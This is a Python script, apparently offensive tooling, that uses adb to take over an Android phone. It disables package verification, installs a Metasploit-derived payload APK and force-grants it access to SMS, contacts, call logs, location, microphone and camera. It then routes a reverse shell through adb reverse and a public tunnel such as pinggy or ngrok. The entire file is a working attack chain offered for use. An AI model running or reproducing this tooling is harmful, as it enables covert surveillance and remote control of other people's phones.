#!/usr/bin/env python3
"""AUTO-PIVOT — USB prime → tcpip → wireless exploit with port switching.

Phase A (USB):  detect USB device → `adb tcpip 5555` → read Wi-Fi IP
Phase B (PIVOT): prompt user to unplug → `adb connect IP:5555` (wireless)
Phase C (PAYLOAD): build FGS payload LHOST=127.0.0.1 → install → launch
Phase D (CHANNEL): adb reverse tcp:4444 tcp:4444 (works over WIRELESS adb too)
Phase E (TUNNEL): start pinggy/ngrok/portmap → public port can be SWITCHED
                  without touching the phone (it always dials 127.0.0.1:4444)
Phase F (SHELL):  pure-python shell on 127.0.0.1:4444, zero metasploit.

Why this rocks:
  * adb reverse survives the USB→WiFi pivot (it rides the adb transport, not USB).
  * The device never needs a routable LHOST — it dials loopback, adb carries it.
  * Public exposure port on the tunnel can rotate freely; the phone is untouched.
"""
from __future__ import annotations

import os
import re
import socket
import subprocess
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

LPORT = 4444
PKG = "com.metasploit.stage"


def log(msg): print(f"\033[1;34m[pivot]\033[0m {msg}", flush=True)
def ok(msg):  print(f"\033[1;32m[ok]\033[0m {msg}", flush=True)
def warn(m):  print(f"\033[1;33m[warn]\033[0m {m}", flush=True)
def err(m):   print(f"\033[1;31m[error]\033[0m {m}", flush=True)


def sh(args, **kw):
    return subprocess.run(args, capture_output=True, text=True, **kw)


def adb(args, serial=None):
    a = ["adb"]
    if serial:
        a += ["-s", serial]
    return sh(a + args)


def usb_serial(skip_wifi=True):
    out = sh(["adb", "devices"]).stdout
    for line in out.splitlines()[1:]:
        parts = line.split()
        if len(parts) >= 2 and parts[1] == "device":
            if skip_wifi and ":" in parts[0]:
                continue
            return parts[0]
    return None


def wifi_ip(serial):
    for args in (
        ["shell", "ip", "-f", "inet", "addr", "show", "wlan0"],
        ["shell", "ip", "route", "get", "8.8.8.8"],
        ["shell", "ifconfig", "wlan0"],
    ):
        out = adb(args, serial).stdout
        m = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)", out) or re.search(r"\bsrc\s+(\d+\.\d+\.\d+\.\d+)", out)
        if m:
            ip = m.group(1)
            if ip != "127.0.0.1" and not ip.startswith("169.254."):
                return ip
    return None


def phase_a(serial):
    log("Phase A — USB prime: tcpip 5555 + read Wi-Fi IP")
    adb(["kill-server"], None)
    adb(["start-server"], None)
    time.sleep(1)
    serial = serial or usb_serial()
    if not serial:
        warn("no USB device. connect the cable now (authorize popup on phone)")
        for _ in range(30):
            serial = usb_serial()
            if serial:
                break
            time.sleep(2)
        if not serial:
            err("no USB device after 60s — abort")
            return None, None, None
    ok(f"USB device: {serial}")
    adb(["shell", "settings", "put", "global", "package_verifier_enable", "0"], serial)
    adb(["tcpip", "5555"], serial)
    time.sleep(2)
    ip = wifi_ip(serial)
    if not ip:
        err("could not read Wi-Fi IP over USB")
        return serial, None, None
    ok(f"device Wi-Fi IP: {ip}")
    return serial, ip, None


def phase_b(ip, timeout=40):
    log("Phase B — PIVOT: waiting for you to UNPLUG USB + stay on same Wi-Fi")
    print("    >>> UNPLUG THE USB CABLE now, keep phone on Wi-Fi, then Enter <<<", flush=True)
    try:
        input()
    except EOFError:
        pass
    t0 = time.time()
    while time.time() - t0 < timeout:
        r = adb(["connect", f"{ip}:5555"])
        if "connected" in r.stdout:
            ok(f"wireless adb up: {ip}:5555")
            return f"{ip}:5555"
        time.sleep(2)
    err("wireless adb connect failed — is phone on the same Wi-Fi?")
    return None


def phase_c(serial):
    log("Phase C — build + install FGS payload (LHOST=127.0.0.1)")
    apk = ROOT / ".payload-build" / "pivot.apk"
    apk.parent.mkdir(parents=True, exist_ok=True)
    r = sh(["bash", str(ROOT / "build_payload.sh"), "--fgs", "127.0.0.1", str(LPORT), str(apk)])
    if r.returncode != 0:
        err("payload build failed")
        return None
    ok(f"payload built: {apk}")
    r = adb(["-s", serial, "install", "-r", str(apk)])
    if r.returncode != 0:
        adb(["-s", serial, "uninstall", PKG])
        r = adb(["-s", serial, "install", str(apk)])
    if r.returncode != 0:
        err("install failed: " + (r.stderr or r.stdout)[-200:])
        return None
    ok("payload installed")
    for perm in ("POST_NOTIFICATIONS", "READ_SMS", "READ_CONTACTS", "READ_CALL_LOG",
                 "ACCESS_FINE_LOCATION", "RECORD_AUDIO", "CAMERA"):
        adb(["-s", serial, "shell", "pm", "grant", PKG, f"android.permission.{perm}"])
    adb(["-s", serial, "shell", "dumpsys", "deviceidle", "whitelist", "+" + PKG])
    return apk


def phase_d(serial):
    log("Phase D — adb reverse over WIRELESS (survives the pivot)")
    adb(["-s", serial, "reverse", f"tcp:{LPORT}", f"tcp:{LPORT}"])
    ok(f"reverse tcp:{LPORT} -> tcp:{LPORT} (wireless channel)")
    adb(["-s", serial, "shell", "am", "force-stop", PKG])
    adb(["-s", serial, "shell", "am", "start", "-n", f"{PKG}/.MainActivity"])
    ok("payload launched")


def phase_e(provider=None):
    log("Phase E — tunnel (public port is SWITCHABLE, phone untouched)")
    try:
        from modules.tunnel import start_tunnel, stop_tunnel
    except Exception as e:
        warn(f"tunnel module import failed ({e}) — local channel only")
        return None
    t = start_tunnel(LPORT, provider)
    if t and t.endpoint_host:
        ok(f"public: {t.endpoint} -> localhost:{LPORT}")
        print("    port switch: rebuild tunnel with another provider/port; payload stays put", flush=True)
    else:
        warn("tunnel not up (no account/token?) — local reverse channel still works")
    return t


def phase_f(serial):
    log("Phase F — pure-python shell (no metasploit)")
    from modules import shell_access
    from modules.shell_access import run
    # capture stage bytes we need for the stager (android/shell/reverse_tcp raw)
    stage = ROOT / ".payload-build" / "shell-stage.bin"
    if not stage.exists():
        r = sh(["msfvenom", "-p", "android/shell/reverse_tcp",
                "LHOST=127.0.0.1", f"LPORT={LPORT}", "-f", "raw", "-o", str(stage)])
        if r.returncode != 0:
            warn("stage not captured (msfvenom?) — plain shell fallback")
            stage = None
    print("\n[bold cyan]▓▓ AUTO-PIVOT SHELL ▓▓[/bold cyan]  (type exit to close)", flush=True)
    run("127.0.0.1", LPORT, timeout=90, stage_file=str(stage) if stage else None)


def main():
    # --tunnel PROVIDER, --usb SERIAL, --no-tunnel
    provider = "pinggy"
    serial_arg = None
    if "--no-tunnel" in sys.argv:
        provider = None
    for i, a in enumerate(sys.argv):
        if a == "--usb" and i + 1 < len(sys.argv):
            serial_arg = sys.argv[i + 1]
        if a == "--tunnel" and i + 1 < len(sys.argv):
            provider = sys.argv[i + 1]

    serial, ip, _ = phase_a(serial_arg)
    if not serial or not ip:
        return 1
    wire = phase_b(ip)
    if not wire:
        return 1
    apk = phase_c(wire)
    if not apk:
        return 1
    phase_d(wire)
    tun = phase_e(provider) if provider else None
    try:
        phase_f(wire)
    except (KeyboardInterrupt, EOFError):
        pass
    if tun:
        try:
            from modules.tunnel import stop_tunnel
            stop_tunnel(tun)
        except Exception:
            pass
    ok("session ended")


if __name__ == "__main__":
    main()
